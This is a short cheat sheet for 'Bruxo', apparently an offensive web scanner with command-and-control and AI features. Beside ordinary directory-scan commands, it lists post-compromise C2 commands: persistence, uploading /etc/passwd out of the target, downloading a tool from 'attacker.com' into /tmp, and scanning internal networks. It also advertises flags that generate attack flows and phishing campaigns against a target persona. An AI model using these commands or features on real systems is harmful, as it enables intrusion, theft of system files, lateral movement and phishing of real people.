# Bruxo Cheat Sheet

A quick reference guide for common Bruxo commands.

## Scanning

- **Basic Scan**: `./bruxo -u <URL> -w <WORDLIST> -o report.html`
- **Fast Scan**: `./bruxo -u <URL> -w <WORDLIST> -t 200`
- **Scan with Extensions**: `./bruxo -u <URL> -w <WORDLIST> -x ".php,.js"`
- **Executive PDF Report**: `./bruxo -u <URL> -w <WORDLIST> --report-format pdf --report-type executive -o report.pdf`

## C2 Commands (via Technical Report)

- **Get Shell Info**: `whoami && id`
- **List Files**: `ls -la`
- **Establish Persistence**: `persist`
- **Upload File**: `upload /etc/passwd`
- **Download Tool**: `download http://attacker.com/tool.sh /tmp/tool.sh`
- **Scan Internal Network**: `internal_scan 192.168.1.0/24`

## AI Features

- **Generate Attack Scenarios**: Add the `--attack-flow` flag to your scan command.
- **Generate Phishing Campaign**: Add `--gen-phishing-campaign "Target Persona"` to your scan command.
